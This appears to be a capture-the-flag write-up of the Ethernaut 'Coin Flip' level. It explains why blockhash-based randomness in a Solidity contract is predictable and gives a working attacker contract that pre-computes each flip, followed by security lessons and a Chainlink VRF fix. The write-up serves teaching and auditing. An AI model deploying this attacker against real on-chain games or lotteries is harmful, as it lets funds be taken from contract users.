---
title: 'Ethernaut - Coin Flip'
description: 'Exploiting weak on-chain randomness using a smart contract. Learn how transaction execution order and historical block data make deterministic randomness highly exploitable.'
date: 2025-07-03
tags: ['solidity', 'security', 'randomness', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🪙 Coin Flip - Predictable Randomness

## Challenge Overview

This level challenges us to build up a consecutive winning streak of **10 correct guesses in a row** on a coin-flipping game.

**The Catch:** If we guess wrong even once, our streak resets to 0. Flipping a coin normally gives us a 50/50 chance, making a 10-win streak statistically improbable ($1/2^{10} \approx 0.097\%$) without exploitation.

---

## Technical Analysis

### Vulnerability: Deterministic On-Chain Randomness

The `CoinFlip` contract relies on block variables to determine the coin flip outcome:

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```

#### The Root Cause
The on-chain randomness calculation is entirely **deterministic**:
1. **`block.number - 1`**: The hash of the previous block is public and known to all nodes.
2. **`FACTOR`**: A static, hardcoded constant (`578960446186...`).

Because Ethereum transactions are batched into blocks, any call made from an attacker contract to the target contract in the same transaction will execute in the **exact same block**. Therefore, both contracts will read the exact same value for `block.number - 1` and resolve the exact same blockhash.

---

## The Exploit: The Multi-Step Solution

To achieve a 100% win rate, we can deploy an intermediate `Attack` contract:
1. **Pre-calculate the Flip**: The attack contract reads `blockhash(block.number - 1)` and performs the exact same division logic as the target.
2. **Execute and Guess**: Once the result is known, the attack contract calls the target's `flip()` function, passing the pre-calculated guess as the parameter.
3. **Repeat 10 Times**: Run this attack function across 10 distinct blocks (as `lastHash == blockValue` prevents calling it multiple times in the same block).

---

## Proof of Concept (PoC)

Here is the attack contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker {
    ICoinFlip public immutable target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = ICoinFlip(_target);
    }

    function attack() external {
        // 1. Re-calculate the expected random side using block.number - 1
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool expectedSide = coinFlip == 1 ? true : false;

        // 2. Submit the 100% accurate guess
        require(target.flip(expectedSide), "Guess failed!");
    }
}
```

---

## Auditor's Lessons

1. **On-Chain Data is Not Secret or Random**: Variables like `block.timestamp`, `blockhash`, `coinbase`, and `difficulty` are completely predictable. Never use them as sources of entropy for critical actions.
2. **Same-Block Execution**: When two contracts interact in a nested call, they share the same execution block environment. Security designs must assume attackers can write custom contract wrappers to frontrun or pre-calculate state.
3. **Use Off-Chain Oracles**: For true, tamper-proof randomness, use solutions like Chainlink VRF (Verifiable Random Function) which uses cryptographic proofs to guarantee un-predictable randomness on-chain.

---

## Remediation

Refactor the contract to ingest verifiable randomness from an external oracle:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@chainlink/contracts/src/v0.8/vrf/VRFConsumerBaseV2.sol";

contract SecureCoinFlip is VRFConsumerBaseV2 {
    uint256 public consecutiveWins;
    // ... Chainlink VRF setup ...

    function requestFlip() external returns (uint256 requestId) {
        // Request secure off-chain randomness
    }

    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        bool side = (randomWords[0] % 2 == 0);
        // Process streak logic securely
    }
}
```
